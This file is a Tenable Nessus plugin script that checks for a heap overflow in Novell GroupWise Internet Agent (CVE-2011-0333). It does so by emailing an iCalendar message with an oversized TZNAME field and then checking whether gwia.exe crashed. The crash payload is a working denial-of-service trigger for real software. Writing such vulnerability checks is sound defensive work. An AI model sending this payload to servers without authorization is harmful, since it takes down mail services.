#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(56634);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2014/05/26 00:12:07 $");

  script_cve_id("CVE-2011-0333");
  script_bugtraq_id(49774);
  script_osvdb_id(75775);

  script_name(english:"GroupWise Internet Agent < 8.0.2 HP3 iCalendar TZNAME Property Heap Overflow");
  script_summary(english:"Tries to kill the Internet Agent (gwia.exe)");

  script_set_attribute(attribute:"synopsis", value:
"The remote host has an email application that is affected by a heap
overflow vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Novell GroupWise Internet Agent hosted on the remote
computer is earlier than 8.0.2 HP3. Such versions are potentially
affected by a heap overflow vulnerability due to the way the
application parses the TZNAME property of the VTIMEZONE component
within a received VCALENDAR message. Successful exploitation could
result in remote code execution.

This script tries to send a VCALENDAR message with a large TZNAME
property value in an attempt to crash the Internet Agent (gwia.exe).

Note that when restarting the Internet Agent after a crash, the queued
files under <domain_database_path>\wpgate\GWIA\receive that are
generated as a result of running this script need to be removed.
Otherwise, the service will not restart.

Also note that the iCal service has to be enabled (the '/imip' setting
in 'gwia.cfg') for this vulnerability to be triggered.

Further note that this install of Group GroupWise Internet Agent is
also likely affected by other vulnerabilities, but this plugin does
not test for them.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8f078d7e");
  script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2011-66/");
  script_set_attribute(attribute:"see_also", value:"http://secunia.com/advisories/43513");
  script_set_attribute(attribute:"solution", value:"Update GWIA to version 8.0.2 Hot Patch 3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/09/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/09/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/10/25");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:novell:groupwise");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"SMTP problems");
  script_copyright(english:"This script is Copyright (C) 2011-2014 Tenable Network Security, Inc.");

  script_dependencies("smtpserver_detect.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/smtp", 25);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");

##
# check if a non-GroupWise SMTP server is listening on a port
#
# @port   - SMTP port
# @return - TRUE if it's a non-GroupWise SMTP server
#           FALSE if it's a GroupWise SMTP server or cannot determine
#
##
function is_non_groupwise_smtp_server(port)
{
  local_var list, server;

  # some non-GroupWise SMTP servers
  list = make_list('sendmail', 'postfix', 'qmail', 'firewall-1', 'exim', 'domino',
                   'intermail', 'xmail', 'postoffice', 'interscan','microsoft_esmtp_5',
                   '4D','602Pro', 'AnalogX', 'AMOS', 'Abbing', 'ArGoSoft', 'AvMailGate',
                   'Avirt', 'BMR', 'CSMap', 'Canon', 'CommuniGate','ConcentricHost',
                   'Cyberguard','DanDomain','ePOST','ESMTP','Eserv','Eudora','FTGate',
                   'FWMAIL', 'FirstClass', 'Gordano', 'IA', 'IBM', 'IMA', 'IMS',
                   'IMail',  'IntraStore', 'LanSuite', 'M', 'MAILsweeper',
                   'MDaemon', 'MSA', 'MTA', 'Mail', 'MailBot', 'MailShield', 'MailSite',
                   'Mailkeep','Mailmax', 'McAfee','Merak','MessageWall', 'Mi',
                   'WindowsNT', 'Mirapoint', 'Mirapoint','MsgCore','NAVGW','NPlex',
                   'TMail', 'Netscape', 'WebShield', 'WebShielde','Norton', 'Obtuse',
                   'Oracle', 'PP', 'Prioserve','Process','Protofax','Routing',
                   'SLMail','SMTP','SNS', 'SPA','Secure','StrongMail','PostMaster',
                   'Smail','Sugarsoft','TIS','USA','VNWD','VPOP','VaMailArmor',
                   'VisNetic','Weasel','Winmail','WinProxy','eSafe','iMate',
                   'iMail','iPlanet','inFusion','magic','Kerio','MERCUR',
                   'WinRoute','MailMarshal','Mercury','MailMax','AppleMailServer',
                   'InterChange','IMail','SMTPXD','QuickMail','Sun','Mailtraq',
                   'Minesweeper','Stalker','eXtremail','LSMTP','Dimac','VopMail',
                   'Symantec','NetGain','ModusMail','mtmail','PowerMTA','BorderWare',
                   'MailEnable','Dmail','Watchguard','SmarterMail','Courier','Trend',
                   'WinWebMail');


  foreach server (list)
  {
    if (get_kb_item('SMTP/'+port+'/'+server) == TRUE)
      return TRUE;
  }

  return FALSE;
}


if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_service(svc:"smtp", default: 25, exit_on_fail: TRUE);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0,'The SMTP server on port '+port+' is broken.');

if(is_non_groupwise_smtp_server(port:port))
  exit(0, 'The SMTP server on port '+port+' does not appear to be GroupWise Internet Agent.');


body =
  'From: nessus\r\n' +
  'To: postmaster\r\n' +
  'Subject: GroupWise Internet Agent iCalendar TZNAME Property Heap Overflow\r\n' +
  'MIME-Version: 1.0\r\n'+
  'Content-Type: text/calendar;method=REQUEST;charset=UTF-8\r\n\r\n' +
  'BEGIN:VCALENDAR\r\n'+
  'VERSION:2.0\r\n'+
  'PRODID:-//Nessus//Nessus//EN\r\n'+
  'BEGIN:VTIMEZONE\r\n' +
  'TZID:US-Eastern\r\n' +
  'LAST-MODIFIED:20110101T000000Z\r\n' +
  'BEGIN:STANDARD\r\n' +
  'DTSTART:20111026T020000\r\n'+
  'RDATE:20111026T020000\r\n'+
  'TZOFFSETFROM:-0400\r\n'+
  'TZOFFSETTO:-0500\r\n' +
  'TZNAME:'+crap(data:'A',length:0x10000)+'\r\n'+
  'END:STANDARD\r\n'+
  'END:VTIMEZONE\r\n'+
  'END:VCALENDAR\r\n';

fromaddr = smtp_from_header();
toaddr = smtp_to_header();

# try to send an iCalendar message to kill the gwia.exe server
if( ! smtp_send_port(port:port, from:fromaddr, to: toaddr, body:body))
  exit(0, 'smtp_send_port() failed.');

# message was queued for further processing, by a different thread.
# wait for the server to die
#
# - Setting the sleep time too low might cause service_is_dead() to be called
#   before the vulnerable code path is run, resulting in a false negative.
#
# - Setting the sleep time too high might also cause a false negative, because
#   the service might have been restarted before service_is_dead() is called.
#
# - If the remote service for some reason is down (e.g., because of power outage)
#   during the sleep interval, the script might produce a false positive.
#
# - Not sure what the optimal sleep time is, because the iCalenadr email message
#   is processed SOME POINT after the message is received. The exact time frame
#   the message gets processed is unpredictable. Sixty seconds sleep time worked
#   during the testing phase, but this plugin will only run in paranoid mode due
#   to the unpredictable nature of the underlying service.
#
#
sleep(60);

# check to see if it's dead
rc = service_is_dead(port:port);

if(rc == 1)
  security_hole(port);
else if(rc == 0)
  exit(0,'The SMTP service listening on port '+port+' does not appear to be affected.');
else
  exit(1,'A timeout occurred while connecting to port '+port+'.');
